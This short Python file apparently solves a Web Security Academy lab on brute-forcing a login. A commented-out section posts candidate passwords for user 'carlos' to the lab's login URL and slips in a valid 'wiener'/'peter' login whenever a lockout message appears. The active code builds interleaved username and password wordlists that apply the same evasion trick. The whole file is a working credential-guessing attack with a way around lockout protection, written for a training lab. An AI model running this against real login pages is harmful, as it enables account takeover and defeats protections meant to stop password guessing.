# import requests
# from tqdm import tqdm
# url = "https://0a8e0053045f4396c1902de3007900e0.web-security-academy.net/login"
# def login(url, username, password):
#     data = {
#         "username": username,
#         "password": password
#     }
#     response = requests.post(url, data=data)
#     return response.text
# passwds = open('../shortlist/passwords.txt').read().split('\n')
# iterator = tqdm(passwds)
# for word in iterator:
#     passwd = word
#     r = login(url, 'carlos', passwd)
#     if 'many' in r:
#         r1 = login(url, 'wiener', 'peter')
#     if 'Your username' in r:
#         iterator.close()
#         print(passwd)
#         break

passwds = open('../shortlist/passwords.txt', 'r')
new_passwds = open('passwords.txt', 'w')
usrname = open('../shortlist/usernames.txt', 'r')
new_usrname = open('usernames.txt', 'w')

for word in usrname:
    new_usrname.write('carlos\n')
    new_usrname.write('wiener\n')

for word in passwds:
    new_passwds.write(word)
    new_passwds.write('peter\n')

